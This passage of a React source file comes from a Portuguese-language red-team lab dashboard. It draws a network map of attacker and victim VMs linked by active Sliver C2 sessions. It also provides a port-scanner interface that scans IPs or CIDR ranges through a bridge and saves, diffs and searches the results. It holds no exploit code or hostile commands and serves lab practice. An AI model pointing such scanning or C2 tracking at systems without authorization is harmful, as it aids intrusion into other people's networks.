            <span className="text-xs text-cyber-muted">WRITEUP GERADO</span>
            <button onClick={copyWriteup} className={`${BTN_GHOST} text-xs`}> Copiar</button>
          </div>
          <div className="bg-cyber-bg border border-cyber-border rounded p-4 font-mono text-xs text-cyber-text whitespace-pre-wrap max-h-[500px] overflow-y-auto leading-relaxed">
            {writeup}
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Network Map ──────────────────────────────────────────────────────────
function NetworkMap({ vms, sliver }) {
  const canvasRef = useRef(null);
  const [hoveredNode, setHoveredNode] = useState(null);

  const nodes = [];
  const edges = [];

  const attackerVms = vms.filter(v => v.role === "atacante");
  const victimVms = vms.filter(v => v.role === "vitima");
  const infraVms = vms.filter(v => v.role === "infra");

  const activeIds = new Set();
  if (sliver?.enabled) {
    sliver.sessions.forEach(s => {
      vms.forEach(vm => {
        if (vm.name && s.hostname && vm.name.toLowerCase() === s.hostname.toLowerCase()) {
          activeIds.add(vm.id);
        }
      });
    });
  }

  const roleColors = { atacante: "#EF4444", vitima: "#4ade80", infra: "#60a5fa" };
  const roleIcons = { atacante: "", vitima: "", infra: "" };

  const WIDTH = 800;
  const HEIGHT = 400;
  const CX = WIDTH / 2;
  const CY = HEIGHT / 2;

  attackerVms.forEach((vm, i) => {
    nodes.push({ id: vm.id, x: 80, y: 80 + i * 100, label: vm.name, role: "atacante", ip: vm.ip_address, os: vm.os, active: activeIds.has(vm.id) });
  });

  if (attackerVms.length === 0) {
    nodes.push({ id: "__attacker", x: 80, y: CY, label: "Atacante", role: "atacante", ip: "—", os: "—", active: false, placeholder: true });
  }

  infraVms.forEach((vm, i) => {
    nodes.push({ id: vm.id, x: CX, y: 60 + i * 100, label: vm.name, role: "infra", ip: vm.ip_address, os: vm.os, active: activeIds.has(vm.id) });
  });

  victimVms.forEach((vm, i) => {
    nodes.push({ id: vm.id, x: WIDTH - 80, y: 80 + i * 100, label: vm.name, role: "vitima", ip: vm.ip_address, os: vm.os, active: activeIds.has(vm.id) });
  });

  if (sliver?.enabled) {
    sliver.sessions.forEach(s => {
      const attackerNode = nodes.find(n => n.role === "atacante" && !n.placeholder) || nodes.find(n => n.role === "atacante");
      const victimNode = nodes.find(n => {
        if (!n.label || !s.hostname) return false;
        return n.label.toLowerCase() === s.hostname.toLowerCase();
      });
      if (attackerNode && victimNode) {
        edges.push({ from: attackerNode, to: victimNode, type: s._type || "session", active: true });
      }
    });
  }

  if (nodes.length <= 1) {
    return (
      <div className={`${CARD} text-center py-10 text-cyber-muted`}>
        <div className="text-3xl mb-2"></div>
        <div>Cadastre VMs na aba "VMs do Lab" para visualizar o mapa de rede</div>
        <div className="text-[11px] mt-1">O mapa mostra conexões ativas entre atacante e alvos comprometidos</div>
      </div>
    );
  }

  return (
    <div>
      <InfoBox title={SECTION_INFO.netmap.title} icon={SECTION_INFO.netmap.icon}>{SECTION_INFO.netmap.content}</InfoBox>
      <div className="text-[11px] text-cyber-muted/70 mb-3">Mapa de rede mostrando VMs do lab e conexões ativas do Sliver.</div>
      <div className={CARD}>
        <svg viewBox={`0 0 ${WIDTH} ${HEIGHT}`} className="w-full" style={{ maxHeight: "450px" }}>
          <defs>
            <marker id="arrow" viewBox="0 0 10 6" refX="10" refY="3" markerWidth="8" markerHeight="6" orient="auto-start-reverse">
              <path d="M0,0 L10,3 L0,6 Z" fill="#10B981" />
            </marker>
            <marker id="arrow-inactive" viewBox="0 0 10 6" refX="10" refY="3" markerWidth="8" markerHeight="6" orient="auto-start-reverse">
              <path d="M0,0 L10,3 L0,6 Z" fill="#334155" />
            </marker>
          </defs>

          {edges.map((e, i) => (
            <line key={i}
              x1={e.from.x} y1={e.from.y} x2={e.to.x} y2={e.to.y}
              stroke={e.active ? "#10B981" : "#334155"}
              strokeWidth={e.active ? 2 : 1}
              strokeDasharray={e.type === "beacon" ? "6 3" : "none"}
              markerEnd={`url(#${e.active ? "arrow" : "arrow-inactive"})`}
              opacity={e.active ? 0.8 : 0.3}
            />
          ))}

          {nodes.map(n => (
            <g key={n.id}
              onMouseEnter={() => setHoveredNode(n.id)}
              onMouseLeave={() => setHoveredNode(null)}
              style={{ cursor: "default" }}
            >
              <circle
                cx={n.x} cy={n.y} r={n.placeholder ? 20 : 24}
                fill={n.active ? roleColors[n.role] + "33" : "#0f172a"}
                stroke={roleColors[n.role]}
                strokeWidth={n.active ? 2.5 : 1.5}
                opacity={n.placeholder ? 0.4 : 1}
              />
              {n.active && (
                <circle cx={n.x} cy={n.y} r={28} fill="none" stroke={roleColors[n.role]} strokeWidth="1" opacity="0.4">
                  <animate attributeName="r" from="28" to="36" dur="2s" repeatCount="indefinite" />
                  <animate attributeName="opacity" from="0.4" to="0" dur="2s" repeatCount="indefinite" />
                </circle>
              )}
              <text x={n.x} y={n.y + 4} textAnchor="middle" fontSize="14">{roleIcons[n.role]}</text>
              <text x={n.x} y={n.y + 40} textAnchor="middle" fontSize="10" fill="#E2E8F0" fontFamily="monospace" fontWeight="bold">
                {n.label.length > 16 ? n.label.slice(0, 14) + ".." : n.label}
              </text>
              {n.ip && !n.placeholder && (
                <text x={n.x} y={n.y + 52} textAnchor="middle" fontSize="8" fill="#64748B" fontFamily="monospace">
                  {n.ip}
                </text>
              )}
              {hoveredNode === n.id && !n.placeholder && (
                <g>
                  <rect x={n.x - 70} y={n.y - 60} width="140" height="40" rx="4" fill="#1e293b" stroke="#334155" />
                  <text x={n.x} y={n.y - 42} textAnchor="middle" fontSize="9" fill="#E2E8F0" fontFamily="monospace">{n.label}</text>
                  <text x={n.x} y={n.y - 30} textAnchor="middle" fontSize="8" fill="#64748B" fontFamily="monospace">
                    {n.os || "—"} · {n.ip || "—"} {n.active ? "· ATIVO" : ""}
                  </text>
                </g>
              )}
            </g>
          ))}

          {/* Legend */}
          <g transform={`translate(10, ${HEIGHT - 50})`}>
            {Object.entries(roleColors).map(([role, color], i) => (
              <g key={role} transform={`translate(${i * 120}, 0)`}>
                <circle cx="6" cy="6" r="5" fill={color + "44"} stroke={color} strokeWidth="1.5" />
                <text x="16" y="10" fontSize="9" fill="#94a3b8" fontFamily="monospace">{VM_ROLE_LABELS[role]}</text>
              </g>
            ))}
            <g transform="translate(360, 0)">
              <line x1="0" y1="6" x2="20" y2="6" stroke="#10B981" strokeWidth="2" />
              <text x="25" y="10" fontSize="9" fill="#94a3b8" fontFamily="monospace">Sessão ativa</text>
            </g>
            <g transform="translate(360, 16)">
              <line x1="0" y1="6" x2="20" y2="6" stroke="#10B981" strokeWidth="2" strokeDasharray="6 3" />
              <text x="25" y="10" fontSize="9" fill="#94a3b8" fontFamily="monospace">Beacon</text>
            </g>
          </g>
        </svg>
      </div>
    </div>
  );
}

// ─── CyberScan ────────────────────────────────────────────────────────────
const SVC_COLORS = {
  HTTP: "#3b82f6", HTTPS: "#8b5cf6", "HTTP-Proxy": "#3b82f6", "HTTP-Alt": "#3b82f6", "HTTPS-Alt": "#8b5cf6",
  SSH: "#22c55e", FTP: "#f59e0b", "FTP-Data": "#f59e0b", SMB: "#ef4444", RDP: "#ec4899",
  MySQL: "#06b6d4", PostgreSQL: "#3b82f6", MSSQL: "#f97316", Redis: "#dc2626", VNC: "#a855f7",
  DNS: "#64748B", Telnet: "#f97316", WinRM: "#10b981", Elasticsearch: "#eab308",
  MongoDB: "#22c55e", LDAP: "#6366f1", LDAPS: "#6366f1", Kerberos: "#f59e0b",
  SMTP: "#06b6d4", SNMP: "#84cc16", Docker: "#2563eb", "K8s-API": "#326ce5",
  Grafana: "#f97316", Consul: "#dc4a7c", "RabbitMQ-Mgmt": "#ff6600",
  _: "#64748B",
};
const svcColor = (s) => SVC_COLORS[s] || SVC_COLORS._;

const SCAN_TABS = [
  { id: "scanner", label: "Scanner", icon: "-"},
  { id: "search", label: "Busca", icon: "-"},
  { id: "dashboard", label: "Intelligence", icon: "-"},
];

function parseSearchQuery(q) {
  const filters = {};
  const freeText = [];
  const tokens = q.match(/(?:[^\s"]+|"[^"]*")/g) || [];
  for (const tok of tokens) {
    const m = tok.match(/^(\w+):(.+)$/);
    if (m) {
      const key = m[1].toLowerCase();
      const val = m[2].replace(/^"|"$/g, "");
      if (["port", "service", "host", "os", "banner", "version"].includes(key)) {
        filters[key] = val;
      } else { freeText.push(tok); }
    } else { freeText.push(tok.replace(/^"|"$/g, "")); }
  }
  return { filters, freeText: freeText.join(" ") };
}

function matchScan(scan, parsed) {
  const { filters, freeText } = parsed;
  if (filters.host && !scan.host.toLowerCase().includes(filters.host.toLowerCase())) return false;
  if (filters.os && !(scan.detected_os || "").toLowerCase().includes(filters.os.toLowerCase())) return false;
  const ports = scan.open_ports || [];
  if (filters.port) {
    const p = parseInt(filters.port);
    if (!ports.some(x => x.port === p)) return false;
  }
  if (filters.service) {
    if (!ports.some(x => x.service.toLowerCase().includes(filters.service.toLowerCase()))) return false;
  }
  if (filters.banner) {
    if (!ports.some(x => (x.banner || "").toLowerCase().includes(filters.banner.toLowerCase()))) return false;
  }
  if (filters.version) {
    if (!ports.some(x => (x.version || "").toLowerCase().includes(filters.version.toLowerCase()))) return false;
  }
  if (freeText) {
    const hay = [scan.host, scan.detected_os, ...ports.map(p => `${p.port} ${p.service} ${p.banner} ${p.version}`)].join(" ").toLowerCase();
    if (!hay.includes(freeText.toLowerCase())) return false;
  }
  return true;
}

function CyberScan({ sliver, vms, sessions, techniques, setTechniques }) {
  const [subTab, setSubTab] = useState("scanner");

  // Scanner state
  const [targets, setTargets] = useState("");
  const [customPorts, setCustomPorts] = useState("");
  const [scanProfile, setScanProfile] = useState("default");
  const [scanning, setScanning] = useState(false);
  const [scanResults, setScanResults] = useState([]);
  const [scanError, setScanError] = useState(null);
  const [selectedLabSession, setSelectedLabSession] = useState("");
  const [expandedHost, setExpandedHost] = useState(null);

  // Search state
  const [searchQuery, setSearchQuery] = useState("");
  const [sortBy, setSortBy] = useState("date");

  // Shared
  const [history, setHistory] = useState([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  const [hostDetail, setHostDetail] = useState(null);

  useEffect(() => {
    setHistoryLoading(true);
    fetchAllScans().then(setHistory).catch(() => {}).finally(() => setHistoryLoading(false));
  }, []);

  const refreshHistory = () => {
    fetchAllScans().then(setHistory).catch(() => {});
  };

  const loadVmTargets = () => setTargets(vms.filter(v => v.ip_address).map(v => v.ip_address).join("\n"));

  const doScan = async () => {
    const targetList = targets.split(/[\n,]+/).map(t => t.trim()).filter(Boolean);
    if (!targetList.length) return;
    setScanning(true);
    setScanError(null);
    setScanResults([]);
    const ports = customPorts.trim() ? customPorts.split(/[,\s]+/).map(p => parseInt(p)).filter(p => p > 0 && p <= 65535) : [];
    try {
      const data = await sliver.runScan(targetList, ports, scanProfile);
      const results = data.results || [];
      setScanResults(results);
      for (const r of results) {
        await saveScanResult({
          session_id: selectedLabSession || null,
          host: r.host, ip_address: r.host, detected_os: r.os || "",
          ports_scanned: data.ports_scanned || 0, open_ports: r.ports || [],
          total_open: r.total_open || 0, scan_profile: data.profile || scanProfile,
        }).catch(() => {});
      }
      refreshHistory();
      if (selectedLabSession && results.some(r => r.total_open > 0)) {
        const tStr = results.map(r => r.host).join(", ");
        const pStr = results.flatMap(r => (r.ports || []).map(p => `${p.port}/${p.service}`)).join(", ");
        createTechnique({
          session_id: selectedLabSession, mitre_id: "T1046", tactic: "Discovery",
          technique_name: "Network Service Scanning", tool_used: "CyberScan", success: true,
          notes: `Alvos: ${tStr}\nPortas abertas: ${pStr}`.slice(0, 2000),
        }).then(t => {
          setTechniques(prev => [t, ...prev]);
          upsertProgress("Discovery", techniques.filter(x => x.tactic === "Discovery").length + 1).catch(() => {});
        }).catch(() => {});
      }
    } catch (err) { setScanError(err.message); }
    finally { setScanning(false); }
  };

  const getPreviousScan = (host, currentId) => {
    return history.find(h => h.host === host && h.id !== currentId);
  };

  const diffPorts = (curr, prev) => {
    if (!prev) return { added: [], removed: [], changed: [], unchanged: curr };
    const prevMap = {};
    (prev.open_ports || []).forEach(p => { prevMap[p.port] = p; });
    const currMap = {};
    curr.forEach(p => { currMap[p.port] = p; });
    return {
      added: curr.filter(p => !prevMap[p.port]),
      removed: (prev.open_ports || []).filter(p => !currMap[p.port]),
      changed: curr.filter(p => prevMap[p.port] && prevMap[p.port].version !== p.version && p.version),
      unchanged: curr.filter(p => prevMap[p.port] && (prevMap[p.port].version === p.version || !p.version)),
    };
  };

  // Search results
  const parsed = parseSearchQuery(searchQuery);
  const searchResults = (() => {
    const latest = {};
    history.forEach(h => {
      if (!latest[h.host] || new Date(h.created_at) > new Date(latest[h.host].created_at)) {
        latest[h.host] = h;
      }
    });
    let arr = Object.values(latest);
    if (searchQuery.trim()) arr = arr.filter(s => matchScan(s, parsed));
    if (sortBy === "date") arr.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    else if (sortBy === "ports") arr.sort((a, b) => b.total_open - a.total_open);
    else if (sortBy === "host") arr.sort((a, b) => a.host.localeCompare(b.host));
    return arr;
  })();

  // Intelligence stats
  const stats = (() => {
    const uniqueHosts = new Set(history.map(h => h.host));
    const allPorts = history.flatMap(h => h.open_ports || []);
    const svcCount = {};
    const portCount = {};
    const osCount = {};
    allPorts.forEach(p => {
      svcCount[p.service] = (svcCount[p.service] || 0) + 1;
      portCount[p.port] = (portCount[p.port] || 0) + 1;
    });
    history.forEach(h => { if (h.detected_os) osCount[h.detected_os] = (osCount[h.detected_os] || 0) + 1; });
    const topSvc = Object.entries(svcCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
    const topPorts = Object.entries(portCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
    const topOS = Object.entries(osCount).sort((a, b) => b[1] - a[1]);
    const mostExposed = [...new Set(history.map(h => h.host))].map(host => {
      const latest = history.filter(h => h.host === host).sort((a, b) => new Date(b.created_at) - new Date(a.created_at))[0];
      return { host, total: latest?.total_open || 0 };
    }).sort((a, b) => b.total - a.total).slice(0, 10);
    return { totalHosts: uniqueHosts.size, totalScans: history.length, totalPorts: allPorts.length, topSvc, topPorts, topOS, mostExposed };
  })();

  // Host detail timeline
  const hostTimeline = hostDetail ? history.filter(h => h.host === hostDetail).sort((a, b) => new Date(b.created_at) - new Date(a.created_at)) : [];

  const exportReport = () => {
    const lines = ["# CyberScan Report", `Gerado: ${new Date().toLocaleString("pt-BR")}`, ""];
    lines.push(`## Estatísticas`, `- Hosts únicos: ${stats.totalHosts}`, `- Total de scans: ${stats.totalScans}`, `- Portas abertas (acumulado): ${stats.totalPorts}`, "");
    if (scanResults.length > 0) {
      lines.push("## Último Scan", "");
      scanResults.forEach(r => {
        lines.push(`### ${r.host}${r.os ? ` (${r.os})` : ""}`, `Portas abertas: ${r.total_open}`, "");
        (r.ports || []).forEach(p => {
          lines.push(`- **${p.port}/${p.service}**${p.version ? ` — ${p.version}` : ""}${p.banner ? `\n  Banner: \`${p.banner.slice(0, 200)}\`` : ""}`);
        });
        lines.push("");
      });
    }
    lines.push("---", "*Gerado pelo CyberScan — CyberLab*");
    navigator.clipboard.writeText(lines.join("\n"));
  };

  const STB = (active) => `px-3 py-2 text-[11px] font-mono cursor-pointer border-b-2 transition-colors ${active ? "border-cyber-accent text-cyber-accent" : "border-transparent text-cyber-muted hover:text-cyber-text"}`;

  // ── Host Detail Modal ──
  if (hostDetail) {
    const latest = hostTimeline[0];
    const prev = hostTimeline[1];
    const diff = latest ? diffPorts(latest.open_ports || [], prev) : { added: [], removed: [], changed: [], unchanged: [] };
    return (
      <div>
        <button onClick={() => setHostDetail(null)} className={`${BTN_GHOST} mb-3`}>← Voltar</button>
        <div className={CARD + " mb-4"}>
          <div className="flex items-center justify-between mb-3">
            <div>
              <div className="text-lg font-bold text-cyber-text font-mono">{hostDetail}</div>
              {latest?.detected_os && <span className="text-[10px] px-2 py-0.5 rounded bg-[#1a1a2e] text-indigo-400 border border-indigo-400/40 font-mono">{latest.detected_os}</span>}
            </div>
            <div className="text-right">
              <div className="text-2xl font-bold text-cyber-accent font-mono">{latest?.total_open || 0}</div>
              <div className="text-[10px] text-cyber-muted">portas abertas</div>
            </div>
          </div>
          <div className="text-[11px] text-cyber-muted">Último scan: {latest ? fmtDateTime(latest.created_at) : "—"} · {hostTimeline.length} scan(s) no histórico</div>
        </div>

        <div className="grid grid-cols-1 gap-4 lg:grid-cols-[1fr_280px]">
          <div>
            <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">PORTAS ABERTAS</div>
            {(latest?.open_ports || []).map(p => {
              const isNew = diff.added.some(a => a.port === p.port);
              const isChanged = diff.changed.some(c => c.port === p.port);
              return (
                <div key={p.port} className={`${CARD} mb-2 ${isNew ? "border-l-[3px] border-l-[#22c55e]" : isChanged ? "border-l-[3px] border-l-[#f59e0b]" : ""}`}>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-sm font-mono font-bold text-cyber-text">{p.port}</span>
                    <span className="text-[10px] px-2 py-0.5 rounded font-mono font-bold" style={{ color: svcColor(p.service), background: svcColor(p.service) + "15", border: `1px solid ${svcColor(p.service)}40` }}>{p.service}</span>
                    {p.version && <span className="text-[11px] text-cyber-muted font-mono">{p.version}</span>}
                    {isNew && <span className="text-[9px] px-1.5 py-0.5 bg-[#0d2818] text-[#22c55e] rounded font-mono font-bold">NOVA</span>}
                    {isChanged && <span className="text-[9px] px-1.5 py-0.5 bg-[#2a1f0a] text-[#f59e0b] rounded font-mono font-bold">VERSÃO MUDOU</span>}
                  </div>
                  {p.banner && <div className="text-[10px] text-cyber-muted font-mono bg-black/30 rounded p-2 mt-1 max-h-24 overflow-y-auto whitespace-pre-wrap break-all">{p.banner.slice(0, 800)}</div>}
                </div>
              );
            })}
            {diff.removed.length > 0 && (
              <div className="mt-3">
                <div className="text-[10px] font-mono text-cyber-danger mb-1">PORTAS QUE FECHARAM (vs scan anterior)</div>
                <div className="flex flex-wrap gap-1">
                  {diff.removed.map(p => (
                    <span key={p.port} className="text-[10px] px-2 py-0.5 bg-[#2a0f0f] text-[#ef4444] border border-[#ef4444]/30 rounded font-mono line-through">{p.port}/{p.service}</span>
                  ))}
                </div>
              </div>
            )}
          </div>

          <div className="space-y-3">
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">AÇÕES</div>
              <div className="space-y-1.5">
                <button onClick={() => { setTargets(hostDetail); setSubTab("scanner"); setHostDetail(null); }} className={`${BTN_GHOST} w-full text-left text-[11px]`}> Re-escanear</button>
                <button onClick={exportReport} className={`${BTN_GHOST} w-full text-left text-[11px]`}> Copiar relatório</button>
              </div>
            </div>
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">TIMELINE</div>
              <div className="space-y-1.5 max-h-[300px] overflow-y-auto">
                {hostTimeline.map((h, i) => (
                  <div key={h.id} className="bg-cyber-bg border border-cyber-border rounded p-2">
                    <div className="flex justify-between text-[10px]">
                      <span className="text-cyber-muted">{fmtDateTime(h.created_at)}</span>
                      <span className="text-cyber-accent font-mono">{h.total_open} aberta(s)</span>
                    </div>
                    <div className="flex flex-wrap gap-1 mt-1">
                      {(h.open_ports || []).slice(0, 8).map(p => (
                        <span key={p.port} className="text-[8px] px-1 py-0.5 rounded font-mono" style={{ color: svcColor(p.service), background: svcColor(p.service) + "10" }}>{p.port}</span>
                      ))}
                      {(h.open_ports || []).length > 8 && <span className="text-[8px] text-cyber-muted">+{(h.open_ports || []).length - 8}</span>}
                    </div>
                    {i === 0 && <span className="text-[8px] text-cyber-accent font-mono">ÚLTIMO</span>}
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div>
      <InfoBox title={SECTION_INFO.cyberscan.title} icon={SECTION_INFO.cyberscan.icon}>{SECTION_INFO.cyberscan.content}</InfoBox>
      {/* Sub-tabs */}
      <div className="flex border-b border-cyber-border mb-4">
        {SCAN_TABS.map(t => (
          <button key={t.id} onClick={() => setSubTab(t.id)} className={STB(subTab === t.id)}>{t.icon} {t.label}</button>
        ))}
        <div className="flex-1" />
        <button onClick={exportReport} className={`${BTN_GHOST} text-[10px] my-1`}> Exportar</button>
      </div>

      {/* ── Scanner Tab ── */}
      {subTab === "scanner" && (
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-[1fr_300px]">
          <div className="space-y-4">
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">ALVOS</div>
              <textarea className={`${INPUT} h-24 resize-none`} placeholder={"IPs, hostnames ou CIDR (um por linha)\nex: 192.168.56.0/24\n    10.0.0.1-10"} value={targets} onChange={e => setTargets(e.target.value)} />
              <div className="flex gap-2 mt-2">
                <button onClick={loadVmTargets} className={`${BTN_GHOST} text-[10px]`} disabled={!vms.filter(v => v.ip_address).length}> VMs ({vms.filter(v => v.ip_address).length})</button>
              </div>
            </div>
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">CONFIGURAÇÃO</div>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-2 mb-3">
                <div>
                  <label className={LABEL}>Perfil</label>
                  <select className={INPUT} value={scanProfile} onChange={e => setScanProfile(e.target.value)}>
                    <option value="quick">Quick (10 portas)</option>
                    <option value="default">Default (28 portas)</option>
                    <option value="full">Full (100+ portas)</option>
                    <option value="custom">Custom</option>
                  </select>
                </div>
                <div>
                  <label className={LABEL}>Portas custom</label>
                  <input className={INPUT} placeholder="80,443,8080" value={customPorts} onChange={e => { setCustomPorts(e.target.value); if (e.target.value.trim()) setScanProfile("custom"); }} />
                </div>
                <div>
                  <label className={LABEL}>Sessão</label>
                  <select className={INPUT} value={selectedLabSession} onChange={e => setSelectedLabSession(e.target.value)}>
                    <option value="">— Nenhuma —</option>
                    {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
                  </select>
                </div>
              </div>
              <button onClick={doScan} disabled={scanning || !targets.trim() || !sliver.enabled} className={`${BTN} w-full disabled:opacity-40`}>
                {scanning ? "ESCANEANDO..." : `INICIAR SCAN (${scanProfile})`}
              </button>
              {!sliver.enabled && <div className="text-[11px] text-amber-400/80 mt-2"> Bridge não conectada.</div>}
            </div>
            {scanError && <div className="text-cyber-danger text-xs">{scanError}</div>}

            {scanResults.map((r, ri) => {
              const prev = getPreviousScan(r.host);
              const diff = diffPorts(r.ports || [], prev);
              const expanded = expandedHost === r.host;
              return (
                <div key={ri} className={CARD + " cursor-pointer"} style={{ borderLeft: `3px solid ${r.total_open > 0 ? "#22c55e" : "#64748B"}` }} onClick={() => setExpandedHost(expanded ? null : r.host)}>
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-bold text-cyber-text font-mono">{r.host}</span>
                      {r.os && <span className="text-[9px] px-1.5 py-0.5 bg-[#1a1a2e] text-indigo-400 rounded font-mono">{r.os}</span>}
                      <span className="text-[10px] text-cyber-muted">{r.total_open} aberta(s)</span>
                    </div>
                    <div className="flex gap-1">
                      {diff.added.length > 0 && <span className="text-[9px] px-1.5 py-0.5 bg-[#0d2818] text-[#22c55e] border border-[#22c55e]/30 rounded font-mono">+{diff.added.length}</span>}
                      {diff.removed.length > 0 && <span className="text-[9px] px-1.5 py-0.5 bg-[#2a0f0f] text-[#ef4444] border border-[#ef4444]/30 rounded font-mono">-{diff.removed.length}</span>}
                      {diff.changed.length > 0 && <span className="text-[9px] px-1.5 py-0.5 bg-[#2a1f0a] text-[#f59e0b] border border-[#f59e0b]/30 rounded font-mono">{diff.changed.length} mudou</span>}
                      <button onClick={e => { e.stopPropagation(); setHostDetail(r.host); }} className={`${BTN_GHOST} text-[9px] px-1.5 py-0.5`}>Detalhe →</button>
                    </div>
                  </div>
                  <div className="flex flex-wrap gap-1 mt-1">
                    {(r.ports || []).map(p => (
                      <span key={p.port} className="text-[9px] px-1.5 py-0.5 rounded font-mono" style={{ color: svcColor(p.service), background: svcColor(p.service) + "12", border: `1px solid ${svcColor(p.service)}30` }}>
                        {p.port}/{p.service}{p.version ? ` (${p.version})` : ""}
                      </span>
                    ))}
                  </div>
                  {expanded && (r.ports || []).some(p => p.banner) && (
                    <div className="mt-3 space-y-2" onClick={e => e.stopPropagation()}>
                      {(r.ports || []).filter(p => p.banner).map(p => (
                        <div key={p.port} className="bg-cyber-bg border border-cyber-border rounded p-2">
                          <div className="text-[10px] font-mono text-cyber-accent mb-1">{p.port}/{p.service}</div>
                          <div className="text-[10px] text-cyber-muted font-mono whitespace-pre-wrap break-all max-h-20 overflow-y-auto">{p.banner.slice(0, 500)}</div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              );
            })}
          </div>

          <div className="space-y-3">
            {scanResults.length > 0 && (
              <div className={CARD}>
                <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-2">RESUMO</div>
                <div className="space-y-1.5">
                  <div className="flex justify-between text-xs"><span className="text-cyber-muted">Hosts</span><span className="text-cyber-text font-mono">{scanResults.length}</span></div>
                  <div className="flex justify-between text-xs"><span className="text-cyber-muted">Portas abertas</span><span className="text-cyber-accent font-mono font-bold">{scanResults.reduce((s, r) => s + (r.total_open || 0), 0)}</span></div>
                  <div className="flex justify-between text-xs"><span className="text-cyber-muted">Perfil</span><span className="text-cyber-text font-mono">{scanProfile}</span></div>
                </div>
                {(() => {
                  const sc = {};
                  scanResults.forEach(r => (r.ports || []).forEach(p => { sc[p.service] = (sc[p.service] || 0) + 1; }));
                  const sorted = Object.entries(sc).sort((a, b) => b[1] - a[1]).slice(0, 8);
                  if (!sorted.length) return null;
                  return (
                    <div className="mt-3 pt-3 border-t border-cyber-border">
                      <div className="text-[10px] font-mono text-cyber-muted mb-1.5">SERVIÇOS</div>
                      {sorted.map(([s, c]) => (
                        <div key={s} className="flex items-center gap-2 mb-1">
                          <div className="w-2 h-2 rounded-full" style={{ background: svcColor(s) }} />
                          <span className="text-[11px] text-cyber-text flex-1">{s}</span>
                          <span className="text-[10px] text-cyber-muted font-mono">{c}</span>
                        </div>
                      ))}
                    </div>
                  );
                })()}
              </div>
            )}
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-1">MITRE ATT&CK</div>
              <a href={mitreUrl("T1046")} target="_blank" rel="noreferrer" className="text-[10px] px-2 py-0.5 bg-[#1a1a2e] text-indigo-400 border border-indigo-400/50 rounded font-mono hover:underline inline-block mb-1">T1046</a>
              <div className="text-[11px] text-cyber-muted">Network Service Scanning</div>
            </div>
          </div>
        </div>
      )}

      {/* ── Search Tab ── */}
      {subTab === "search" && (
        <div>
          <div className={CARD + " mb-4"}>
            <div className="flex gap-2 items-end">
              <div className="flex-1">
                <label className={LABEL}>BUSCAR (filtros: port:22 service:SSH host:192.168 os:Windows banner:Apache version:2.4)</label>
                <input className={INPUT + " text-sm"} placeholder='ex: port:445 os:Windows   ou   "Apache" service:HTTP' value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
              </div>
              <select className={`${INPUT} w-auto`} value={sortBy} onChange={e => setSortBy(e.target.value)}>
                <option value="date">Data</option>
                <option value="ports">Portas</option>
                <option value="host">Host</option>
              </select>
            </div>
          </div>

          <div className="text-[10px] text-cyber-muted mb-2">{searchResults.length} host(s) encontrado(s){searchQuery.trim() ? ` para "${searchQuery}"` : " (todos)"}</div>

          {historyLoading && <div className="text-[11px] text-cyber-muted">Carregando dados...</div>}

          {searchResults.map(h => (
            <div key={h.id} className={CARD + " mb-2 cursor-pointer hover:border-cyber-accent/30 transition-colors"} style={{ borderLeft: `3px solid ${h.total_open > 0 ? "#22c55e" : "#64748B"}` }} onClick={() => setHostDetail(h.host)}>
              <div className="flex items-center justify-between mb-1">
                <div className="flex items-center gap-2">
                  <span className="text-sm font-bold text-cyber-text font-mono">{h.host}</span>
                  {h.detected_os && <span className="text-[9px] px-1.5 py-0.5 bg-[#1a1a2e] text-indigo-400 rounded font-mono">{h.detected_os}</span>}
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] text-cyber-muted">{fmtDate(h.created_at)}</span>
                  <span className="text-[10px] text-cyber-accent font-mono font-bold">{h.total_open}</span>
                </div>
              </div>
              <div className="flex flex-wrap gap-1">
                {(h.open_ports || []).map(p => (
                  <span key={p.port} className="text-[9px] px-1.5 py-0.5 rounded font-mono" style={{ color: svcColor(p.service), background: svcColor(p.service) + "12" }}>
                    {p.port}/{p.service}
                  </span>
                ))}
              </div>
            </div>
          ))}
          {!historyLoading && searchResults.length === 0 && (
            <div className={`${CARD} text-center py-8 text-cyber-muted`}>
              <div className="text-2xl mb-2"></div>
              <div className="text-xs">{searchQuery ? "Nenhum resultado para os filtros aplicados" : "Nenhum scan salvo ainda — execute um scan primeiro"}</div>
            </div>
          )}
        </div>
      )}

      {/* ── Intelligence Dashboard ── */}
      {subTab === "dashboard" && (
        <div>
          {/* Stats cards */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-3 mb-4">
            {[
              { label: "Hosts Únicos", val: stats.totalHosts, cls: "text-cyber-accent" },
              { label: "Total de Scans", val: stats.totalScans, cls: "text-blue-400" },
              { label: "Portas Abertas", val: stats.totalPorts, cls: "text-purple-400" },
              { label: "Serviços Únicos", val: stats.topSvc.length, cls: "text-amber-400" },
            ].map(s => (
              <div key={s.label} className={`${CARD} text-center`}>
                <div className={`text-xl sm:text-2xl font-extrabold ${s.cls}`}>{s.val}</div>
                <div className="text-[10px] text-cyber-muted mt-1">{s.label}</div>
              </div>
            ))}
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-4">
            {/* Top Ports */}
            <div className={CARD}>
              <div className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest mb-3">TOP 10 PORTAS</div>
